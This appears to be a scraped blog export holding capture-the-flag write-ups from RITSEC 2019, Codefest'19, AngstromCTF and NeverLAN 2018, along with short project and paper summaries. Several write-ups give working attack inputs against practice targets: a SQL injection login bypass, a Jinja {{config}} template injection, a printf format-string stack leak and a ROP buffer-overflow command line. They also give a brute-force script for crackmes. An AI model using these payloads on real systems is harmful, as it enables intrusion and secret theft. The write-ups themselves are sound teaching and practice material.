to RITSEC, we get the flag as — RITSEC{YOUALPHABETIZEDYOURNUMBERS}\n Web  misdirection — 100 pts\nWe are given a URL — http://ctfchallenges.ritsec.club:5000/ However, on clicking it we see that we are directed to another webpage http://ctfchallenges.ritsec.club:5000/n and the information that the webpage isn\u0026rsquo;t redirecting properly. So, I decided to see what is happening, for that I did a simple wget to the url.\n\r\r\rRunning wget\r\r\rWe see that the page redirects to different pages and keeps doing that. We note that the last character is basically in the flag format when put together. We do that and get the flag — RS{4!way5_Ke3p-m0v1ng}\n Buckets of fun — 100 pts\nWe are given the following URL — http://bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com/\nTaking a hint from the name of the challenge, we try the following URL in the browser —http://bucketsoffun-ctf.s3.amazonaws.com\n\r\r\rThe webpage\r\r\rWe see a file youfoundme-asd897kjm.txt\nHeading to http://bucketsoffun-ctf.s3.amazonaws.com/youfoundme-asd897kjm.txt we find the flag — RITSEC{LIST_HIDDEN_FILES}\n Forensics  Take it to the Cleaners — 100 pts\nWe are given an image\n\r\r\rThe challenge\r\r\rPerforming basic recon, we check the metadata for the image using exiftool.\n\r\r\rexiftool output\r\r\rIn the user comment, we see a string which is probably base64 encoded.\nDecoding it gives, EVGFRP{SBERAFVPF_SNVYF_JBAG_URYC_LBH_URER}\nLooks rotated by an offset. We use http://theblob.org/rot.cgi to get rotations by different offsets. This is ROT13 and the flag is — RITSEC{FORENSICS_FAILS_WONT_HELP_YOU_HERE}\n Long Gone — 100 pts\nWe are provided a chromebin. Extract it as it is a tar archive.\n tar xzvf ./chromebin\n We see there are a lot of folders, on inspecting the history we find it is an SQLite 3.X database. Loading it into DBBrowser, and inspecting the tables, shows an odd URL — us-central-1.ritsec.club/l/relaxfizzblur\nOpening the url gives the flag — RITSEC{SP00KY_BR0WS3R_H1ST0RY}\n Pwn  999 Bottles — 110 pts\nWe are given 999 ELF files, each having a password as a single character. Basically, 999 crackmes with a one character password. If we check the disassembly of main function of any one —\n\r\r\rThe disassembly for main\r\r\rAt 0x8048728 we see a comparison, where register edx (dl) stores our input character and eax (al) stores the value at address 0x804a039.\nAlso, in the disassembly, we have some character mappings to addresses —\n\r\r\rCharacter mappings\r\r\rSo, one way to solve this challenge is to get the address to be compared and check the character at this address and automate it somehow.\nDuring the CTF, however, I wrote a bruteforce script to try all characters for every ELF file.\nfrom pwn import *\rimport string\rFOLDER = \u0026#39;./elfs/\u0026#39;\rfilenames = []\rs = string.digits + string.letters + string.punctuation\rfor i in range(1,1000):\rfilenames.append(str(i).zfill(3) + \u0026#39;.c.out\u0026#39;)flag = \u0026#39;\u0026#39;\rf = open(\u0026#39;flag.txt\u0026#39;, \u0026#39;w\u0026#39;)\rfor file in filenames:\rfor inp in s:\rp = process(FOLDER+file)\rp.recv()\rp.sendline(inp)\ra = p.recvline()\rif \u0026#39;OK!\u0026#39; in a:\rflag += inp\rp.close()\rprint(\u0026#34;FLAG: \u0026#34; + flag)\rf.write(\u0026#34;FLAG: \u0026#34; + flag)\rf.write(\u0026#39;\\n\u0026#39;)\rbreak\relse:\rp.close()\rf.write(\u0026#34;FLAG: \u0026#34; + flag)\rprint(flag)\rf.close()\rFinally, we have the following string in the output generated -\n lr^wN${HnW\u0026lt;DtVjk.RITSEC{AuT057v}^W!xT\n Note the string in the flag format, that is the flag — RITSEC{AuT057v}\nA better way to solve it actually using the method described above. The following script can help do that -\nimport r2pipe import binascii import sys\rfor i in range(1, 1000): print(\u0026#39;elfs/{0:03}\u0026#39;.format(i)) b = r2pipe.open(\u0026#39;elfs/{0:03}\u0026#39;.format(i) + \u0026#39;.c.out\u0026#39;)\rdisass = b.cmd(\u0026#39;aaa; s main; pdd\u0026#39;) field = disass.split(\u0026#34;eax = *(obj.\u0026#34;)[1][0] byte = disass.split(f\u0026#39;*(obj.{field}) = \u0026#39;)[-1][2:4] print(binascii.unhexlify(byte).decode(\u0026#39;ascii\u0026#39;), sep=\u0026#39;\u0026#39;)\rThis is all. Thanks for reading!\nFollow me on Twitter, Github or connect on LinkedIn.\n","date":1574184719,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1575041698,"objectID":"c98121fa35ee86bc6b229e067718175a","permalink":"https://shreyansh26.github.io/post/2019-11-19_ritsec-ctf-2019/","publishdate":"2019-11-19T17:31:59.681Z","relpermalink":"/post/2019-11-19_ritsec-ctf-2019/","section":"post","summary":"A bit late for writeups, but still here are the solutions to the challenges I solved during the CTF. The CTF was from 15 Nov. 2019, 22:30 IST — Mon, 18 Nov. 2019, 10:30 IST. It was a decent CTF with quality challenges, from both beginner to advanced level.\nUpdate: The scripts to solve and the flags are present in this repo.\nI\u0026rsquo;ll do the writeups category-wise -\n Crypto  pre-legend — 100 pts","tags":["ctf","information security","infosec","writeups"],"title":"RITSEC CTF 2019","type":"post"},{"authors":null,"categories":["Information Security"],"content":"The Capture the Flag event for Codefest’19 was hosted from 8 pm, 23rd August 2019 to 12 noon, 24th August 2019 on Hackerrank.\nThe contest link can be found here. There were a total of 1532 registrations and 518 people who were successful in solving atleast one challenge.\nSo, onto the writeups.\nWelcome to Codefest 19! (Intro Challenge — 100pts) This was the introductory challenge. I had tried to make it a bit difficult than the normal introductory challenges, but I felt that it proved to be a bit difficult for the beginners.\n\r\r\rThe challenge\r\r\rHere, first you had to join the telegram group linked in the proble. There you got the first half of the flag — **CodefestCTF{G3t_r3ady_**. For the other half there was a pinned message on the group.\n The other half of the flag was uploaded on the contest page yesterday by accident. It has now been removed. Can you find it?\n For this you had to use archive.org, there was a snapshot of the contest page created on 23rd Aug 2019. Viewing the snapshot got you the second half of the flag —f0r_C0def3stCTF-8fb34fjr4bs43ur8}.\nSo, the final flag is — CodefestCTF{G3t_r3ady_f0r_C0def3stCTF-8fb34fjr4bs43ur8}\n What language is this? (Misc — 100pts) This was basically a esoteric language question. The given text was —\niiisdsiiioiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiodddddddddddoioiodoiiiiiiiiiiiiiioiodddddddddddddddddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiioddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiioiiiiiiiodddddddddodddddddddddddddddddddddddddddddddddddddddddddddddddoddddddddddddddddddddddddddddddddddddddsiiiiiiiiioddddddddoddddddoiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddoddddddddddddddddddddddddddddddddsiiisisdddddoddddddddddddddddddddddddddddodddddddddddddddddddoddddddddddddddddddddddddddddddddsiiisisoioiodoiiiiiiiiiiiiiioiodddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddoiiiiiiiioddddddddddddddddddddddddddddddddddddddddddddddsiiiio\rThe language was Deadfish. You could use an online decoder for that language, something like this.\nThe final flag was — CodefestCTF{Welc0me_t0_C0defest19}\n Gibberish file (Misc — 100pts) \r\r\rThe challenge\r\r\rThe hint was in the problem statement. You had to reverse the file to find the flag. A simple one-line script could do it\nopen(\u0026#34;output2.txt\u0026#34;, \u0026#34;wb\u0026#34;).write(open(\u0026#34;output.txt\u0026#34;, \u0026#34;rb\u0026#34;).read()[::-1])\rThe resulting had some text like\n 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ\n The flag was the ASCII analog of each unicode character.\nThe flag was — CodefestCTF{LiTErAL_REVERSinG}\n Image Corruption (Forensics — 100pts) In the challenge, you were given a link to a corrupted .bmp file. On viewing the file in a hex editor, and also checking the magic bytes —\n\r\r\rHex view of the image\r\r\rWe know there is something to do with “matrix”. Also for a normal .bmp file the initial magic bytes are 424d 8a44 1300. XORing this with the first six bytes of the given file also gives you “matrix”. So to solve the challenge, we XOR the whole image with “matrix”.\n Run the script, and you obtain the correct file.\n\r\r\rThe correct file\r\r\rThe flag is — CodefestCTF{f1l35_h4v3_m461c_by735}\n Mail capture (Steganography— 100pts) You are presented with a “email friendly text”. This was encoded to unicode by a tool called uuencode. It can be decoded by using uudecode, a decoder for such formats. Running uudecode with the file gives an output file called “flag_encoded”. The contents are the flag — CodefestCTF{7h15_15_4_c001_3nc0d1n9}\n Cats are innocent, right? (Steganography— 500pts) This challenge was based on LSB steganography. I had used a tool called stegify.\nThe challenge image -\n\r\r\rChallenge image\r\r\rOn running the command -\n stegify -op decode -carrier cute_kittens.jpg -result hello\n We get a hello.zip file which was embedded in the LSBs of the image. The zip file had a file inside it but that was of no use. The flag was appended at the end of the zip file.\n\r\r\rThe flag is appended at the end of the zip file\nThe flag is — CodefestCTF{h1d1ng_b3h1nd_1nn0c3nt_k1tt3n5}\n Weird encoding (Misc— 200pts) \r\r\rThe challenge\r\r\rWe are given the following “encoding”\n0x85+1x1+0x14\r0x7+1x1+0x7+1x1+0x9+1x2+0x3+1x4+0x3+1x1+0x6+1x5+0x1+1x1+0x2+1x1+0x1+1x2+0x13+1x2+0x3+1x1+0x8+1x1+0x5+1x2+0x8\r0x1+1x5+0x18+1x3+0x3+1x1+0x16+1x2+0x1+1x1+0x5+1x2+0x2+1x1+0x3+1x1+0x4+1x2+0x3+1x3+0x3+1x1+0x2+1x2+0x4+1x3+0x8\r0x3+1x1+0x7+1x1+0x11+1x2+0x1+1x1+0x3+1x5+0x12+1x1+0x2+1x1+0x7+1x1+0x10+1x1+0x3+1x2+0x1+1x1+0x5+1x3+0x4+1x1+0x1+1x2+0x2+1x1+0x4\r0x3+1x1+0x3+1x1+0x7+1x2+0x3+1x1+0x2+1x1+0x2+1x1+0x7+1x1+0x11+1x2+0x2+1x2+0x5+1x2+0x10+1x1+0x3+1x1+0x2+1x1+0x3+1x2+0x2+1x1+0x4+1x4+0x7\r0x3+1x1+0x3+1x1+0x3+1x1+0x1+1x3+0x10+1x1+0x7+1x1+0x7+1x1+0x3+1x1+0x3+1x1+0x1+1x2+0x2+1x3+0x8+1x5+0x4+1x1+0x3+1x9+0x1+1x3+0x7\r0x3+1x1+0x3+1x3+0x1+1x1+0x1+1x4+0x9+1x1+0x6+1x2+0x2+1x1+0x7+1x2+0x3+1x1+0x2+1x1+0x4+1x1+0x10+1x1+0x6+1x1+0x7+1x1+0x7+1x4+0x4\r0x5+1x1+0x1+1x1+0x1+1x1+0x1+1x1+0x4+1x2+0x7+1x2+0x3+1x4+0x11+1x1+0x4+1x1+0x2+1x1+0x3+1x2+0x6+1x1+0x3+1x1+0x6+1x1+0x7+1x1+0x1+1x1+0x1+1x5+0x7\r0x7+1x1+0x1+1x1+0x1+1x1+0x2+1x3+0x7+1x5+0x16+1x1+0x4+1x1+0x2+1x1+0x1+1x3+0x3+1x6+0x2+1x1+0x2+1x1+0x1+1x5+0x5+1x1+0x2+1x1+0x4+1x1+0x7\r0x18+1x5+0x13+1x6+0x27+1x1+0x14+1x1+0x2+1x2+0x2+1x1+0x5+1x1+0x2\r0x1+1x1+0x5+1x1+0x4+1x1+0x3+1x1+0x8+1x1+0x8+1x1+0x9+1x1+0x8+1x1+0x5+1x1+0x17+1x1+0x10+1x3+0x9\r0x68+1x1+0x11+1x1+0x19\rHere a bit of observation was required to figure out that the “x” symbol mean concatenation n number of a character, like 0x5 will mean 00000. And “+” would mean concatenation of two strings of different type. Also, one will also have to decide on 0 representing 255 255 255 i.e. the color white and 1 representing 0 0 0 , i.e. the color black. You could have experimented with both combinations but eventually you would get the correct mapping.\nThe following script can help generate the image.\n The obtained image is this -\n\r\r\rYou may want to zoom in a bit\r\r\rThe flag is — CodefestCTF{This_15_7h3_f14g}.\n Linux RE 1 (Reversing — 300pts) This challenge was a bit difficult to solve using a debugger due to some anti-debugging techniques that were implemented. Also, initially the ELF was packed using UPX, which was visible as a string when you would have run the strings command. So, first use\n upx -d\n with the ELF to decompress it.\nFor the next part, You could use a disassembler or a decompiler to get the source code and eventually reverse the binary. The executable was generated from a C++ file hence it was a bit messy to view in a decompiler.\nThe decompiled view (using Ghidra) of the main function (the interesting part) is the following -\n\r\r\rDecompiled main function\r\r\rThe key_int and enc_int are global variables. The main logic of the ELF is in the rahasya function.\n\r\r\rDecompiled rahasya function\r\r\rThis basically takes two strings and XORs them and returns the XORd string. The two strings it takes as input are the user input and the key_int string. The XORd data is matched with the enc_int data.\nSo, basically to reverse the binary you have to XOR both the key_int and enc_int data.\n\r\r\renc_int data\r\r\r\r\r\rkey_int data\r\r\rBasically,\n int enc_int[] = {80, 93, 3, 67, 3, 86, 11, 110, 64, 2, 90, 27, 84, 28, 110, 75, 3, 69, 52, 6, 11, 5, 80, 88, 90, 88};\n  int key_int[] = {49, 51, 51, 55, 107, 101, 121};\n XOR both of them, and you get an0th3r_s1mp1e_x0r_cr4ckm3\nSo, the flag is CodefestCTF{an0th3r_s1mp1e_x0r_cr4ckm3}\n Linux RE 2 (Reversing — 500pts) Again we open the file in IDA or any disassembler and/or decompiler we see that the input should satisfy a set of conditions on the letters of the input.\nThe conditions can be translated as\n We can use some kind of SMT solver like z3 to find the password.\n The obtained password is — shouldve_used_some_tool\nThe flag, hence, is CodefestCTF{shouldve_used_some_tool}\n Windows RE (Reversing — 500pts) In this problem, the Windows exe file (actually a .NET file) that was provided, was packed with ConfuserEx. We can use NoFuserEx, which is a free deobfuscator for this packer.\nThen, open the executable in any .NET decompiler like dnSpy and check the Form function to get the password as well as the flag.\n Password — thisisa1337password\n The flag — CodefestCTF{51mp13_1npu7_v411d4710n_8u7_w17h_4_7w157}\n No Fatshaming (Web — 600pts) I’ll cheat a bit here xD. You can read my friend Yashit’s awesome writeup on the challenge.\nFlag is — CodefestCTF{1AmTeHHHAX00Rr4uj8rfi4e$%y5yhrf}\nHope you had a great time solving the challenges and that it was a good learning experience for beginners.\nFollow me on Twitter, Github or connect on LinkedIn.\n","date":1566760385,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1575041686,"objectID":"0089a9c6c06237869357602a9fc17b24","permalink":"https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/","publishdate":"2019-08-25T19:13:05.36Z","relpermalink":"/post/2019-08-25_codefest19-ctf-writeups/","section":"post","summary":"The Capture the Flag event for Codefest’19 was hosted from 8 pm, 23rd August 2019 to 12 noon, 24th August 2019 on Hackerrank.\nThe contest link can be found here. There were a total of 1532 registrations and 518 people who were successful in solving atleast one challenge.\nSo, onto the writeups.\nWelcome to Codefest 19! (Intro Challenge — 100pts) This was the introductory challenge. I had tried to make it a bit difficult than the normal introductory challenges, but I felt that it proved to be a bit difficult for the beginners.","tags":["ctf","information security","infosec","writeups"],"title":"Codefest’19 CTF Writeups","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Information Security"],"content":"A study on fooling Machine Learning/Deep Learning based Network Intrusion Detection systems to prevent them from detecting intrusions. We implement various adversarial machine learning attacks on network traffic data and analyze their effect on the accuracy of the model in detecting intrusions.\n","date":1557057510,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557057510,"objectID":"e785c7271041ad26f37d23d121dadc2a","permalink":"https://shreyansh26.github.io/project/nids/","publishdate":"2019-05-05T17:28:30+05:30","relpermalink":"/project/nids/","section":"project","summary":"A study on fooling Machine Learning/Deep Learning based Network Intrusion Detection systems to prevent them from detecting intrusions","tags":["nids","deep learing","machine learning","neural networks","information security","adversarial machine learning"],"title":"Network Intrusion Detection in an Adversarial setting","type":"project"},{"authors":["Shreyansh Singh"],"categories":["Information Security"],"content":"Implemented various papers on Linux Malware detection, where I analysed the structure of ELF files to determine whether they were malicious or benign. Approaches included the analysis of -\n Symbol Table Opcode frequency ELF file metadata  ","date":1546519033,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1546519033,"objectID":"d1283dcc6d71ee2ff4c1de6da8f4bce9","permalink":"https://shreyansh26.github.io/project/linux-malware/","publishdate":"2019-01-03T18:07:13+05:30","relpermalink":"/project/linux-malware/","section":"project","summary":"Implemented various papers on Linux Malware detection, where I analysed the structure of ELF files to determine whether they were malicious or benign. Approaches included the analysis of -\n Symbol Table Opcode frequency ELF file metadata  ","tags":["malware","machine learning","information security","reverse engineering"],"title":"Linux Malware detection using Machine Learning","type":"project"},{"authors":["Shreyansh Singh"],"categories":["Natural Language Processing"],"content":"A shared task organized at ACL 2018 (Association for Computational Linguistics, Melbourne, Australia). The task aims to determining the word order and inflecting words from given unordered Universal Dependencies (UD) structures from which word order information has been removed and the tokens have been lemmatized. Worked on techniques like Language Modelling and Neural Machine Translation methods to solve the problem of reinflection and correct word order generation.\n","date":1532344948,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1532344948,"objectID":"adc5aec5c95f4bdaa39bf007e922c0ef","permalink":"https://shreyansh26.github.io/project/msr-nlg/","publishdate":"2018-07-23T16:52:28+05:30","relpermalink":"/project/msr-nlg/","section":"project","summary":"Our system for a Narural Language Generation based shared task organized at ACL 2018 (Association for Computational Linguistics, Melbourne, Australia).","tags":["nlp","nlg","neural networks","ai","deep learning","language model"],"title":"Multilingual Surface Realization for NLG","type":"project"},{"authors":["Shreyansh Singh","Ayush Sharma","Avi Chawla","A.K. Singh"],"categories":null,"content":"","date":1530383400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1530383400,"objectID":"7dfe204aa4b818105acd6c326b606aa0","permalink":"https://shreyansh26.github.io/publication/singh-etal-2018-iit/","publishdate":"2018-07-01T00:00:00+05:30","relpermalink":"/publication/singh-etal-2018-iit/","section":"publication","summary":"This paper describes our submission system for the Shallow Track of Surface Realization Shared Task 2018 (SRST′18). The task was to convert genuine UD structures, from which word order information had been removed and the tokens had been lemmatized, into their correct sentential form. We divide the problem statement into two parts, word reinflection and correct word order prediction. For the first sub-problem, we use a Long Short Term Memory based Encoder-Decoder approach. For the second sub-problem, we present a Language Model (LM) based approach. We apply two different sub-approaches in the LM Based approach and the combined result of these two approaches is considered as the final output of the system.","tags":null,"title":"IIT (BHU) Varanasi at MSR-SRST 2018: A Language Model Based Approach for Natural Language Generation","type":"publication"},{"authors":null,"categories":["Information Security"],"content":"These are the writeups to the problems I solved during the AngstromCTF.\n MISC  1. Waldo1\nWe are given a zip file — flags.zip containing flags of countries. The file flag5.png, we see on opening has the flag.\n\r\r\rFlag-Waldo1\r\r\r 2. Waldo2\nIn this problem, we are given multiple flag images in a folder. Judging by the problem, it seems that one image is different. We see the md5 hash of the few files which are the same-9f6e902c233020026caf0ebbb1cf0ff5. So we write the following script-\n So, the filename we get is waldo339.jpg. Running strings on the file we get the flag as — actf{r3d_4nd_wh1t3_str1p3s}.\n 3. That’s not my name\nWe are given a pdf file — gettysburg.pdf, but on trying to open it, it does not open, giving incorrect file format error. We run binwalk on the file to see that it infact is a docx file. We change the extension to .docx anf on opening we get the flag as — actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}.\n 4. File Transfer\n\r\r\rCapture\r\r\rThe highlighted packet shows a JPEG image capture. We export the JPEG as bytes to get the image.\n\r\r\rFlag — File Transfer\r\r\r 5. GIF\nOn running binwalk on the given image, we see that it is infact a collection of many images.\nSo , we run the command binwalk -D 'png image:png' jiggs.gif.png. On inspecting the extracted files, we see an image which has the flag.\n\r\r\rFlag — Gif\r\r\r Crypto  1. Warmup\nFrom the term fine cipher, we get the hint that it could be an Affine cipher. We use an online Affine cipher solver to get the flag as — actf{it_begins}.\n 2. Back to Base-ics\nWe are given the following cipher text -\n\r\r\rCiphertext\r\r\rNow we can easily see that the Part 1 is binary(base 2) and Part 3 is hexadecimal(base 16). On decoding them using any online converter, we get\nPart 1: actf{0ne_tw0_f0\nPart 3: n_th1rtytw0_s1x\nAlso judging from the title of the problem, we can say that all the ciphers have the base of some power of two. We guess that Part 2 could be base 8(octal). using an online octal to text converter we get,\nPart 2: ur_eight_sixt33\nThe last one looks like base64. On decrypting, we get\nPart 4: tyf0ur_no_m0re}\nSo, the flag is — actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}\n 3. XOR\nThis looks like a singlebyteXOR problem. We use the following script\n On seeing all the plain texts, we get the flag as — actf{hope_you_used_a_script}.\n 4. Intro to RSA\nThis is a classical RSA problem, we use the following script to decrypt\n So the flag is — actf{rsa_is_reallllly_fun!!!!!!}.\n WEB  1. Source Me 1\nHere, we are presented with a login page. On inspecting the source, we find the password —f7s0jkl, in the comments. **** So, we login with the username as admin and password as f7s0jkl.\nThis gives us the flag-actf{source_aint_secure}.\n 2. Get Me\nInitially all we have is a button with the message that only authorized users are allowed to pass. On clicking the button, we get the message that we are not authorized. However in the url bar we see that the get parameter is auth=false. We change it to auth=trueand hit enter.\nWe then get the flag — actf{why_did_you_get_me}.\n 3. Sequel\nThis is a classic case of SQL injection(SQLi). The hint here is the name of the problem which is pronunciation of SQL.\nWe enter both username and password as 'or''='.\nThis gives us the flag — actf{sql_injection_more_like_prequel_injection}.\n 4. Source Me 2\nWe are give another login page. Here, too, the username is admin. On inspecting the source, we find the script which converts our entered password to md5 and compares it to the hash bdc87b9c894da5168059e00ebffb9077. We use an online md5 decryptor to get the password as password1234. Entering this gives the flag — actf{md5_hash_browns_and_pasta_sauce}.\n 5. Madlibs\nHere, from the Flask code we see that there is a variable app.secret_key, which is basically a config variable. So we head to Tale of a Person section and enter {{config}} as the Author name and any random strings in the other options.\n\r\r\rHere we see the SECRET_KEY variable assigned to the flag, actf{wow_ur_a_jinja_ninja}\n Reversing(RE)  1. Rev1\nFirst, we run strings on the given ELF executable. We see the string, s3cret_pa55word. This could be the secret password the program is looking for. On running the executable and giving the above string as key, we get the flag. This is to be done on the shell server.\n 2. Rev2\nThe ELF on executing asks for a number to be guessed. We use radare2 to disassemble the code.\n\r\r\r\r\r\rThe highlighted hex, 0x11d7 is 4567 in decimal. On entering this, the program now asks us to give two two-digit numbers. We again analyze the disassembled code.\n\r\r\rThis tells us that the product of the two numbers should be 0xd67 i.e 3431. From this link, we find that the numbers are 47 and 73. We enter them in ascending order, i.e 47 and then 73.\nWe get the flag as — actf{4567_47_73}.\n Binary  1. Accumulator\nHere the ideas is to keep adding integers to an int variiable and without explicitly entering negative values, we have to make the result negative. This can be done by integer overflow.\n\r\r\rRunning these inputs on the shell server will give us the flag.\n 2. Cookie Jar\nThis is a buffer overflow problem. Although we never explicitly gave a value to numCookie, we can overflow the buffer so that it gets a value. I fwe the following input — aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa99999998 to the program, we get the flag.\nThe flag is — actf{eat_cookies_get_buffer}.\n 3. Number Guess\nWe take the help of the hint given. The most common vulnerability of the printf function is the use(or not) of format strings.\nIn the code, just before the printf(buf) the two random integers are initialized. So, when we are asked for our name, if we give the following input, %d %d %d %d %d %d %d %d %d %d %d %d . This would give us the other numbers in the stack. On running this, we take the 3rd and the 9th value as rand1 and rand2. We add them and give the result as our guess.\n\r\r\rSo the flag is -actf{format_stringz_are_pre77y_sc4ry}.\n 4. Rop to the Top\nThis is an example of Return Oriented Programming (ROP) vulnerability which is basically buffer overflow to access the non-executable stack. To exploit it we can use the following set of commands-\n\r\r\rWe find that the address of the_top function is 0x8048db. Also the buffer size is 0x28.\nSo, the following command works for us-\n./rop_to_the_top32 \u0026ldquo;$(python -c \u0026lsquo;print \u0026ldquo;A\u0026rdquo;*0x28 + \u0026ldquo;BBBB\u0026rdquo; + \u0026ldquo;\\xdb\\x84\\x04\\x08\u0026rdquo;')\u0026quot;\nWe enter the character ‘A’ to fill the size of the buffer, “BBBB” to replace the current stack pointer (%ebx) followed by the address to which we wish to point to, here the address of the_top function.\nRunning the above command on the shell server gives us the flag.\n For more writeups, you can follow me on Github\n","date":1521808624,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1575041664,"objectID":"471b26bb4249728777987eb7deb93689","permalink":"https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/","publishdate":"2018-03-23T12:37:04.861Z","relpermalink":"/post/2018-03-23_angstromctf-writeups/","section":"post","summary":"These are the writeups to the problems I solved during the AngstromCTF.\n MISC  1. Waldo1\nWe are given a zip file — flags.zip containing flags of countries. The file flag5.png, we see on opening has the flag.\n\r\r\rFlag-Waldo1\r\r\r 2. Waldo2\nIn this problem, we are given multiple flag images in a folder. Judging by the problem, it seems that one image is different.","tags":["ctf","information security","infosec","writeups"],"title":"AngstromCTF Writeups","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Information Security"],"content":"These are the writeups of the problems I solved over the weekend for the NeverLAN CTF 2018.\n Scripting Challenges  1. Basic Math\nWe are given a file with some numbers which we had to sum.\n\r\r\rFile\r\r\rSo, we write a simple python script to do it.\n This gives the flag — 49562942146280612\n 2. More Basic Math\nThis time we have a larger list of numbers. However, we can just run the script again on the new file.\nThis gives us the flag — 50123971501856573397\n 3. Even more Basic Math with some junk\nIn this file, we see that we have spaces, commas and even English words in between the file. Using any text editor, we replace the commas with a space, and then write a script to replace all spaces with new lines.\n Then we run our first script again. We find two or three English words which give Value Error when the script is run. For them, we can manually remove them.\nFinally, we get the flag — 34659711530484678082\n 4. JSON Parsing 1\nOn analysing the file, we find that each line is a JSON. We have to find the 5 AV engines which had the highest detection ratio (not detection count) in that file.\nWe write the following script to do that —\n The last five in the list are —\n\r\r\rHigh Detection Ratio AV engines\r\r\rSo the flag is — SymantecMobileInsight,CrowdStrike,SentinelOne,Invincea,Endgame\n Reversing Challenges  1. Commitment Issues\nThe first thing which came to my mind is to run strings on the file. I did, and got the flag —flag{don’t_string_me_along_man!}\n Interweb Challenges  1. ajax_not_soap\nOn inspecting the script(ajax) of the webpage, we find that the form compares our username and password with one that is stored at the endpoint /webhooks/get_username.php. On going to that link we find the username as MrClean.\nAlso the password is also checked by the endpoint /webhooks/get_pass.php?username=*username* Replacing username with MrClean we get the password (also the flag) as flag{hj38dsjk324nkeasd9}\n 2. the_red_or_blue_pill\nThe page says we can either take the red pill(endpoint ?red ) or the blue pill(endpoint ?blue ) but not both. We enter the endpoint as ?red\u0026amp;blue to get the flag as flag{breaking_the_matrix…I_like_it!}\n 3. ajax_not_borax\nThis problem is very similar to ajax_not_soap with the difference here that when we go to the endpoint /webhooks/get_username.php?username=, we are presented with a hash (c5644ca91d1307779ed493c4dedfdcb7). We use an online MD5 decryptor to get the value as tideade. Then, when we go to the endpoint /webhooks/get_pass.php?username=tideade, we get a base64 encoded string, which on decryption gives the flag as flag{sd90J0dnLKJ1ls9HJed}\n 4. Das_blog\nFirst, when we are presented with a login page, we find that a testing credential is available as a 